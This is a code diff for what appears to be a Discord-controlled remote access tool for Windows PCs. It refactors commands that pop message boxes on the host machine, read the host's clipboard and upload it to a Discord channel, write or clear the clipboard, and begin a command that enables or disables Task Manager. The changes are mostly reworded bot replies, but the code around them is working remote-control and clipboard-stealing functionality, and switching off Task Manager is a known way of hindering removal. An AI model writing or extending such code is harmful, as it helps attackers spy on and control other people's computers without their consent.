@@ -8,18 +8,8 @@ async def alert(ctx, *, args=None):
     if not args or ',' not in args:
         embed = discord.Embed(
             title="Invalid Arguments",
-            description="You must provide a message and a title separated by a comma.",
+            description="You must provide a message and a title separated by a comma.\n\n**Usage:** `.alert <message>, <title>`\n**Example:** `.alert error here, PC is done`",
             color=discord.Color.red()
-        )
-        embed.add_field(
-            name="Usage",
-            value=".alert <message>, <title>",
-            inline=False
-        )
-        embed.add_field(
-            name="Example",
-            value=".alert error here, pc is done",
-            inline=False
         )
         embed.set_footer(text="ALERT COMMAND")
         await ctx.send(embed=embed)
@@ -27,54 +17,45 @@ async def alert(ctx, *, args=None):
 
     msg, title = map(str.strip, args.split(',', 1))
 
+    async def show_alert(msg, title):
+        try:
+            loop = asyncio.get_event_loop()
+            await loop.run_in_executor(None, ctypes.windll.user32.MessageBoxW, 0, msg, title, 0x30)
+        except Exception:
+            pass
+
+    asyncio.create_task(show_alert(msg, title))
+
     embed = discord.Embed(
-        title=f"Alert: {title}",
-        description=msg,
+        title="🔔 Alert Shown",
+        description=f"**Title:** `{title}`\n**Message:** ```{msg}```",
         color=discord.Color.green()
     )
     embed.set_footer(text="ALERT SENT")
     await ctx.send(embed=embed)
 
-    async def show_alert(msg, title):
-        try:
-            loop = asyncio.get_event_loop()
-            await loop.run_in_executor(None, ctypes.windll.user32.MessageBoxW, 0, msg, title, 0x30)
-            embed = discord.Embed(
-                title="Alert Shown",
-                description=f"**Title:** {title}\n**Message:** {msg}",
-                color=discord.Color.green()
-            )
-            embed.set_footer(text="ALERT COMMANDS")
-            await ctx.send(embed=embed)
-        except Exception as e:
-            await ctx.send(f"An error occurred: {e}")
-    asyncio.create_task(show_alert(msg, title))
-
 async def cb(ctx, *, action: str = None):
-
-
     content = ctx.message.content.strip()
 
     if content.startswith(".cb write "):
         text = content[len(".cb write "):].strip()
         if text:
             pyperclip.copy(text)
-            await ctx.send(f"Text copied to clipboard: {text}")
+            await ctx.send(f"Copied: {text}")
         else:
-            await ctx.send("Please provide text to write to the clipboard.")
+            await ctx.send("Provide text to copy.")
         return
 
     if content.startswith(".cb get"):
-        clipboard_text = pyperclip.paste()
-        if clipboard_text:
-            clipboard_dir = os.path.expanduser('~/Documents/cb')
-            os.makedirs(clipboard_dir, exist_ok=True)
-            clipboard_file_path = os.path.join(clipboard_dir, "clipboard.txt")
-            with open(clipboard_file_path, "w") as f:
-                f.write(clipboard_text)
-            await ctx.send(file=discord.File(clipboard_file_path, "clipboard.txt"))
+        text = pyperclip.paste()
+        if text:
+            path = os.path.join(os.path.expanduser('~/Documents/cb'), "clipboard.txt")
+            os.makedirs(os.path.dirname(path), exist_ok=True)
+            with open(path, "w") as f:
+                f.write(text)
+            await ctx.send(file=discord.File(path, "clipboard.txt"))
         else:
-            await ctx.send("Clipboard is empty.")
+            await ctx.send("Clipboard empty.")
         return
 
     if content.startswith(".cb clear"):
@@ -82,19 +63,13 @@ async def cb(ctx, *, action: str = None):
         await ctx.send("Clipboard cleared.")
         return
 
-    if content.startswith(".cb help"):
-        embed = Embed(
-            title="Clipboard Manipulation Commands",
-            description="Manage clipboard contents",
-            color=discord.Color.green()
-        )
-        embed.add_field(name=".cb write <text>", value="Writes the specified text to the clipboard", inline=False)
-        embed.add_field(name=".cb get", value="Gets the current clipboard text and saves it in 'clipboard.txt' in your Documents folder", inline=False)
-        embed.add_field(name=".cb clear", value="Clears the clipboard content", inline=False)
-        embed.add_field(name=".cb help", value="Displays this help message", inline=False)
-        await ctx.send(embed=embed)
-        return
-    await ctx.send("Invalid argument. Try `.cb help` for help.")
+    embed = Embed(title="Clipboard Commands", color=discord.Color.green())
+    embed.add_field(name=".cb write <text>", value="Write text to clipboard", inline=False)
+    embed.add_field(name=".cb get", value="Get clipboard contents", inline=False)
+    embed.add_field(name=".cb clear", value="Clear clipboard.", inline=False)
+    embed.add_field(name=".cb help", value="Show this message.", inline=False)
+    await ctx.send(embed=embed)
+
 async def taskmanagerset(ctx, action: str):
     if action.lower() not in ["enable", "disable"]:
         await ctx.send("Invalid action. Use `enable` or `disable`.")
